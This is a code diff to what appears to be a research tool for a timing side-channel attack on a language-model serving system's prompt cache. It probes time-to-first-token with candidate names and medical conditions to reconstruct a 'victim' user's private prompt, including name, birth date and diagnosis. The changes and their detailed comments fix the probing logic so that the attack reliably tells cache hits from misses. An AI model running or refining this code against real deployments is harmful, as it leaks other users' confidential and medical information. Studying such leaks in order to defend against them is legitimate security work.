@@ -277,7 +277,7 @@ def calibrate_two_stage(
             build_two_stage_prompt(
                 system_prefix, true_name, true_dob,
                 f"{_DUMMY_CONDITION}_{_uuid.uuid4().hex[:8]}",  # unique each call
-                tokenizer, use_dummy_cond=True,
+                tokenizer, use_dummy_cond=False,  # use the passed condition, not hardcoded
             )
         )
         for _ in range(n_samples)
@@ -421,26 +421,45 @@ def reconstruct_victim_two_stage(
     for probe_idx, cand_name in enumerate(names):
 
         # Reseed victim's full prompt to keep blocks fresh in LRU
+        # Stage 1 reseed: send the FULL victim prompt (correct name + correct condition).
+        # Do NOT use victim_record["stage1_probe"] — that uses use_dummy_cond=True which
+        # hardcodes "diabetes" as the condition. Reseeding with "diabetes" accumulates
+        # diabetes condition blocks in the cache, causing Stage 2 to find "diabetes" as
+        # a spurious full HIT before the victim's real condition is ever encountered.
+        # Using the full prompt keeps the CORRECT condition in cache for Stage 2.
         if probe_idx > 0 and probe_idx % RESEED_EVERY == 0:
             try:
-                backend.measure_ttft(victim_record["stage1_probe"])
+                backend.measure_ttft(victim_record["prompt"])
                 s1_calls += 1
             except Exception as exc:
                 print(f"[reconstructor_v2] WARNING: Stage 1 reseed failed: {exc}")
 
-        # Stage 1 probe: name block + dummy condition block.
-        # Use N_REPEATS_STAGE1 (default 3) instead of N_REPEATS_FAST (1)
-        # because the S1_HIT vs MISS gap (~175 ms below T1) is tighter than
-        # the full HIT vs MISS gap — averaging 3 samples reduces false positives
-        # without tripling overall cost (Stage 1 is only ~50 probes out of ~763).
+        # Stage 1 probe: name block + UNIQUE dummy condition block.
+        # CRITICAL: must use a unique dummy condition per probe, not the
+        # fixed _DUMMY_CONDITION. If the same dummy condition is reused,
+        # its filler blocks (blocks N+129..N+191) get cached after the
+        # first probe — subsequent probes then HIT those cached condition
+        # blocks regardless of the candidate name, making Stage 1 useless.
+        # Fix: append a unique hex suffix so each probe's condition block
+        # has a unique hash, guaranteeing a cold miss every time.
+        unique_dummy = f"{_DUMMY_CONDITION}_{uuid.uuid4().hex[:8]}"
         probe = build_two_stage_prompt(
-            system_prefix, cand_name, dob, _DUMMY_CONDITION, tokenizer,
-            use_dummy_cond=True,
+            system_prefix, cand_name, dob, unique_dummy, tokenizer,
+            use_dummy_cond=False,   # use the passed unique condition, not the hardcoded one
         )
-        mean_ttft  = backend.measure_mean_ttft(probe, n=N_REPEATS_STAGE1)
-        s1_calls  += N_REPEATS_STAGE1
+        # Stage 1 probe: ALWAYS measure with N=1 (single call).
+        # Cache timing oracles require the FIRST TTFT — that is the cold-miss
+        # measurement. If N>1, call 1 caches the probe, and calls 2..N are
+        # always cache hits (~182 ms). The mean then collapses to
+        # (MISS + HIT + HIT...) / N ≈ 635 ms for ALL candidates — both
+        # correct and wrong names return the same averaged value, making
+        # Stage 1 unable to distinguish anything.
+        # N_REPEATS_CONFIRM (=3) is correct for confirming a known HIT
+        # (same prompt, expect consistent fast TTFT). N=1 is correct here.
+        mean_ttft  = backend.measure_ttft(probe)
+        s1_calls  += 1
 
-        is_s1_hit = mean_ttft < t1_ms
+        is_s1_hit = bool(mean_ttft < t1_ms)
         s1_log.append({
             "name"     : cand_name,
             "mean_ttft": round(mean_ttft, 3),
@@ -488,7 +507,7 @@ def reconstruct_victim_two_stage(
         mean_ttft  = backend.measure_mean_ttft(probe, n=N_REPEATS_FAST)
         s2_calls  += N_REPEATS_FAST
 
-        is_s2_hit = mean_ttft < t2_ms
+        is_s2_hit = bool(mean_ttft < t2_ms)
         s2_log.append({
             "condition": cand_cond,
             "mean_ttft": round(mean_ttft, 3),
